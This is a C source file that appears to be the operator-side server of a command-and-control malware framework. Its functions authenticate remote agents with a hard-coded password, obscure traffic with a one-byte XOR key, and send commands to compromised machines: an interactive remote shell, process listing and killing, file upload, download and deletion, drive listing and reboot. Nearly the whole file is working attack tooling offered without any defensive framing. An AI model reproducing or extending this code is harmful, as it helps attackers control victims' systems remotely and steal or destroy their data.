#include <stdio.h>
#include <string.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>  
#include <errno.h>
#include <termios.h>
#include <libgen.h>
#include <sys/param.h>
#include "c2_modules.h"
#define BUFFER_SIZE 2048
#define TRAFFIC_KEY 0x02

int AuthClient(char *recv_buf){

	// Authenticate client via tokenizing the received buffer
	
	char* token;
	//char* NextToken = NULL;
	char* LastToken = NULL;
	token = strtok(recv_buf, "-");
	// Checks for delimiter
	while (token != NULL) {
		printf("%s\n", token);
		LastToken = token;
		
		// go through other tokens
		token = strtok(NULL, "-");
	}
	
	printf("password string is %s\n", LastToken);
	
	if (strcmp(LastToken,"qawsed") != 0){printf("[x] exiting\n");return -1;}
	printf("[+] AGENT AUTH SUCCESS\n");
	return 0;
}

void decrypt(unsigned char* recv_buf, size_t recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}
void encrypt(unsigned char* recv_buf, size_t recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}

void HandleLspid(char *cmd,int client_socket){

	ssize_t sent_bytes = 0;
	ssize_t bytes_received = 0;
	encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
	if (sent_bytes == -1){
		perror("[x] send() failed");
		return;
	}

	char recv_buf[BUFFER_SIZE] = {0};
		
    int done_receiving = 0;
    
    do {
        bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
        if (bytes_received < 0) {
            perror("[x] recv() failed");
            exit(EXIT_FAILURE);
        }
        
        if (bytes_received > 0) {
            
            decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
            recv_buf[bytes_received] = '\0'; // Null-terminate
            
            // Check if this chunk contains "done"
            if (strstr(recv_buf, "[DONE]") != NULL) {
                char* done_pos = strstr(recv_buf, "[DONE]");
                *done_pos = '\0'; // Truncate at "done"
                done_receiving = 1;
            }
            
            printf("%s", recv_buf);
        }
        
    } while (!done_receiving && bytes_received > 0);
	return;
}

void HandleShell(char *cmd,int client_socket) {
	


    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    
    // Send initial command
    sent_bytes = send(client_socket, cmd, strlen(cmd), 0);
    if (sent_bytes == -1) {
        perror("[x] send() failed");
        return;
    }
    int stdin_flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    int sock_flags = fcntl(client_socket, F_GETFL, 0);

    // Set stdin to non-blocking so we can check for user input
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
    
    // Set socket to non-blocking for the select() call
    fcntl(client_socket, F_SETFL, O_NONBLOCK);
    
    while (1) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(client_socket, &readfds);
        FD_SET(STDIN_FILENO, &readfds);
        
        // Use select to monitor both socket and stdin
        int max_fd = (client_socket > STDIN_FILENO) ? client_socket : STDIN_FILENO;
        int activity = select(max_fd + 1, &readfds, NULL, NULL, NULL);
        
        if (activity < 0) {
            perror("select error");
            break;
        }
        
        // Check if data is available from the socket (shell output)
        if (FD_ISSET(client_socket, &readfds)) {
            char recv_buf[BUFFER_SIZE] = {0};
            bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
            
            if (bytes_received <= 0) {
                // Connection closed or error
                if (bytes_received == 0) {
                    printf("\n[x] Shell disconnected\n");
                } else {
                    perror("[x] recv() failed");
                }
                break;
            }
            
            // Print the shell output
            printf("%.*s", (int)bytes_received, recv_buf);
            fflush(stdout);
        }
        
        // Check if data is available from stdin (user input)
        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            char input_buf[BUFFER_SIZE] = {0};
            ssize_t input_len = read(STDIN_FILENO, input_buf, BUFFER_SIZE - 1);
            
            if (input_len > 0) {
                // Send user input to the shell
            	if (strcmp(input_buf,"exit\n") == 0){
            		sent_bytes = send(client_socket, input_buf, input_len, 0);
                    
                    // Add a small delay to let the exit command be processed
                    // and output be sent back before we break
                    sleep(1);
                    
                    // Clean up and exit
                    fcntl(STDIN_FILENO, F_SETFL, stdin_flags);
                    fcntl(client_socket, F_SETFL, sock_flags);
                    tcflush(STDIN_FILENO, TCIFLUSH);
                    clearerr(stdin);
                    return;
            	}


                sent_bytes = send(client_socket, input_buf, input_len, 0);
                if (sent_bytes == -1) {
                    printf("[x] Failed to send input to shell\n");
                    break;
                }
            }
        }
    }
    
    // Restore original flags
    fcntl(STDIN_FILENO, F_SETFL, flags);
    fcntl(client_socket, F_SETFL, sock_flags);
    tcflush(STDIN_FILENO, TCIFLUSH);
    clearerr(stdin);


 	return;
 }

void HandleStopProcess(char *cmd, int client_socket){

    char* space_pos = strchr(cmd, ' ');
    if (space_pos == NULL) {
        return;
    }
    //printf("[+] THE PID is %s\n", space_pos + 1);     //DEBUG

    if (atoi(space_pos+1) == 0){
        perror("[x] Invalid PID, please enter a valid value");
        return;
    }

    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;

    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
    if (sent_bytes == -1){
        perror("[x] send() failed");
        return;
    }

    char recv_buf[BUFFER_SIZE] = {0};

    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {
        perror("[x] recv() failed");
        exit(EXIT_FAILURE);
    }

    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
    switch (atoi(recv_buf)){
        case 1:
            printf("[x] Can't get requested proc handle\n");
            break;
        case 2:
            printf("[x] Can't terminate process\n");
            break;
        case 0:
            printf("[+] process terminated successfully\n");
            break;
        default:
            printf("[x] NO CASE MATCH, DEBUG MORE!\n");
            break;
    }

    return;
}


// Server will send data , Agent will receive
// GetFileFromC2() will be called in Agent/Client
//DONE
int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsPath) {


    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
    if (sent_bytes == -1){
        printf("[x] send() failed\n");
        return -1;
    }
    
    // Check if file exists
    //FILE* file = fopen(filename, "rb");
    int file = open(filename,O_RDONLY);
    if (file == -1) {
        perror("Failed to open file");
        return -1;
    }


    // Get file stats 
    struct stat file_stat;
    if (fstat(file, &file_stat) < 0)
    {
            fprintf(stderr, "Error fstat --> %s", strerror(errno));

            exit(EXIT_FAILURE);
    }

    fprintf(stdout, "File Size: %ld bytes\n", file_stat.st_size);

    


    // send file size
    char file_size[BUFFER_SIZE];
    sprintf(file_size, "%ld", file_stat.st_size);

    encrypt( (unsigned char *)file_size,(size_t) strlen(file_size));
    printf("[+] Encrypt success\n");
    sent_bytes = send(client_socket,file_size,(size_t) sizeof(file_size),0);
    if (sent_bytes == -1){
        printf("[x] send() failed\n");
        return -1;
    }
    printf("[+] send() file size success\n");
    



    // Create temporary file for encrypted data
    char tmp_filename[] = "/tmp/encrypted_XXXXXX";
    int tmp_fd = mkstemp(tmp_filename);
    if (tmp_fd == -1) {
        perror("[x] Failed to create temp file");
        close(file);
        return -1;
    }
    printf("[+] created tmp file\n");

    // Read, encrypt, write to temp file
    unsigned char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    
    while ((bytes_read = read(file, buffer, BUFFER_SIZE)) > 0) {
        // Encrypt buffer
        encrypt((unsigned char *)buffer, (size_t) bytes_read);
        
        // Write to temp file
        if (write(tmp_fd, buffer, bytes_read) != bytes_read) {
            perror("[x] Failed to write to temp file");
            close(file);
            close(tmp_fd);
            unlink(tmp_filename);
            return -1;
        }
    }
    printf("[+] Encrypted tmp file success\n");

    char recv_buf[BUFFER_SIZE] = {0};
    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE, 0);
    if (bytes_received < 0) {
        perror("[x] recv() failed");
        close(file);
        close(tmp_fd);
        unlink(tmp_filename);
        return -1;
    }
    
    decrypt( (unsigned char *)recv_buf,(size_t) strlen(recv_buf));
    int err_no = 16000;
    err_no = atoi(recv_buf);
    printf("err_no is %d\n",err_no);
    if (err_no != 16000){
        printf("[x] File couldn't be sent: %s\n",strerror(err_no));
        close(file);
        close(tmp_fd);
        unlink(tmp_filename);
        return -1;
    }

    //send file data
    off_t offset = 0;
    int remain_data = file_stat.st_size;

    
    
    while (((sent_bytes = sendfile(client_socket, tmp_fd, &offset, BUFFER_SIZE)) > 0) && (remain_data > 0))
        {
                fprintf(stdout, "Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
                remain_data -= sent_bytes;

        }

    
    
    //printf("\n[+] File sent successfully!\n");

    close(file);
    close(tmp_fd);
    unlink(tmp_filename);



    return 0;
}


// Server will receive data , Agent will send
// UploadFileToC2() will be called from Agent/Client
// ------ WORKING ON THAT
int DownloadFile(char *cmd,int client_socket, char * filename, char * SavePath) {

    ssize_t bytes_received = 0;
    ssize_t sent_bytes = 0;
    char recv_buf[BUFFER_SIZE] = {0};
    char response_buf[BUFFER_SIZE] = {0};
    
    // Send command (encrypted)
    encrypt((unsigned char *)cmd, (size_t)strlen(cmd));
    sent_bytes = send(client_socket, cmd, strlen(cmd), 0);
    if (sent_bytes == -1) {
        printf("[x] send() failed\n");
        return -1;
    }
    
    // Receive file size from client
    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE, 0);
    if (bytes_received <= 0) {
        perror("[x] Failed to receive file size");
        return -1;
    }
    
    // Decrypt file size
    decrypt((unsigned char *)recv_buf, (size_t)bytes_received);
    long file_size = atol(recv_buf);
    printf("[+] File size to receive: %ld bytes\n", file_size);
    
    // Construct full save path
    char full_path[BUFFER_SIZE];
    char *bnFileName = basename(filename);
    snprintf(full_path, sizeof(full_path), "%s/%s", SavePath, bnFileName);
    
    // Open file for writing
    printf("full_path: %s\n",full_path);
    FILE* file = fopen(full_path, "wb");
    if (!file) {
        perror("[x] Failed to open file for writing");
        // Send error to client
        sprintf(response_buf, "%d", errno);
        encrypt((unsigned char *)response_buf, strlen(response_buf));
        send(client_socket, response_buf, strlen(response_buf), 0);
        return -1;
    }
    
    // Send acknowledgment to client
    sprintf(response_buf, "%d", 16000);
    encrypt((unsigned char *)response_buf, strlen(response_buf));
    sent_bytes = send(client_socket, response_buf, strlen(response_buf), 0);
    if (sent_bytes == -1) {
        printf("[x] Failed to send acknowledgment\n");
        fclose(file);
        return -1;
    }
    
    printf("[+] Ready to receive file: %s\n", full_path);
    
    // Create temporary file for encrypted data
    char tmp_filename[] = "/tmp/received_XXXXXX";
    int tmp_fd = mkstemp(tmp_filename);
    if (tmp_fd == -1) {
        perror("[x] Failed to create temp file");
        fclose(file);
        return -1;
    }
    printf("[+] Created temporary file for encrypted data\n");
    
    // Receive encrypted data and write to temp file
    int total_received = 0;
    int remain_data = file_size;
    
    while (remain_data > 0) {
        // Receive chunk
        bytes_received = recv(client_socket, recv_buf, 
                              MIN(BUFFER_SIZE, remain_data), 0);

        
        if (bytes_received <= 0) {
            if (bytes_received == 0) {
                printf("[!] Connection closed by client\n");
            } else {
                perror("[x] recv() failed");
            }
            break;
        }
        
        // Write encrypted data to temp file
        if (write(tmp_fd, recv_buf, bytes_received) != bytes_received) {
            perror("[x] Failed to write to temp file");
            break;
        }
        
        total_received += bytes_received;
        remain_data -= bytes_received;
        
        printf("Received %ld bytes, %d bytes remaining\n", 
               bytes_received, remain_data);
        
        // Optional: Send acknowledgment for each chunk
        // Uncomment if you want per-chunk acknowledgment
        /*
        sprintf(response_buf, "%d", 16000);
        encrypt((unsigned char *)response_buf, strlen(response_buf));
        sent_bytes = send(client_socket, response_buf, strlen(response_buf), 0);
        if (sent_bytes == -1) {
            printf("[x] Failed to send chunk acknowledgment\n");
            break;
        }
        */
    }
    
    // Reset temp file pointer to beginning
    lseek(tmp_fd, 0, SEEK_SET);
    
    // Read from temp file, decrypt, and write to final file
    unsigned char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    int bytes_written = 0;
    
    printf("[+] Decrypting and writing file...\n");
    
    while ((bytes_read = read(tmp_fd, buffer, BUFFER_SIZE)) > 0) {
        // Decrypt buffer
        decrypt(buffer, (size_t)bytes_read);
        
        // Write to final file
        size_t written = fwrite(buffer, 1, bytes_read, file);
        if (written != bytes_read) {
            perror("[x] Failed to write to final file");
            break;
        }
        bytes_written += written;
    }
    
    // Cleanup
    fclose(file);
    close(tmp_fd);
    unlink(tmp_filename);
    
    if (remain_data > 0) {
        printf("[x] File transfer incomplete. %d bytes missing\n", remain_data);
        return -1;
    }
    
    printf("[+] File received successfully! Total bytes written: %d\n", bytes_written);
    printf("[+] File saved to: %s\n", full_path);
    
    return 0;
}


int HandleDelete(char *cmd, int client_socket, char * filename){
    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
    if (sent_bytes == -1){
        perror("[x] send() failed");
        return -1;
    }
    char recv_buf[BUFFER_SIZE] = {0};

    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
    if (bytes_received < 0) {
        perror("[x] recv() failed\n");
        exit(EXIT_FAILURE);
    }
    
    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
    //printf("[+] recv_buf == %s\n",recv_buf);
    int err_no = atoi(recv_buf);
    if (err_no == 0){
        printf("[+] Deleted %s successfully!\n",filename);
        return 0;
    }
    
    printf("[x] Delete failed! Err: %d\n",err_no);
    return 0;
}


void HandleListDrives(char *cmd , int client_socket){
    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
    if (sent_bytes == -1){
        perror("[x] send() failed");
        return;
    }
    char recv_buf[BUFFER_SIZE] = {0};

    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
    if (bytes_received < 0) {
        perror("[x] recv() failed\n");
        exit(EXIT_FAILURE);
    }
    
    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
    printf("%s\n",recv_buf);

    return;
}

void HandleGetFileDate(char *cmd , int client_socket, char * filename){
    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
    if (sent_bytes == -1){
        perror("[x] send() failed");
        return;
    }
    char recv_buf[BUFFER_SIZE] = {0};

    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
    if (bytes_received < 0) {
        perror("[x] recv() failed\n");
        exit(EXIT_FAILURE);
    }
    
    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
    
    /*
    //printf("[+] recv_buf == %s\n",recv_buf);
    int err_no = atoi(recv_buf);
    if (err_no == 0){
        printf("[+] Deleted %s successfully!\n",filename);
        return 0;
    }
    printf("[x] Delete failed! Err: %d\n",err_no);
    */
    printf("%s\n",recv_buf);
    
    

    return;
}

int HandleReboot(char *cmd , int client_socket){
    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
    if (sent_bytes == -1){
        perror("[x] send() failed");
        return -1;
    }
    char recv_buf[BUFFER_SIZE] = {0};

    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
    if (bytes_received < 0) {
        perror("[x] recv() failed\n");
        exit(EXIT_FAILURE);
    }
    
    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
    printf("[+] recv_buf == %s\n",recv_buf);
    unsigned long err_no = atoi(recv_buf);
    if (err_no == (unsigned long) 16000){
        printf("[+] Rebooted successfully!\n");
        return 0;
    }
    
    printf("[x] reboot failed! Err: %ld\n",err_no);


    return -1;
}
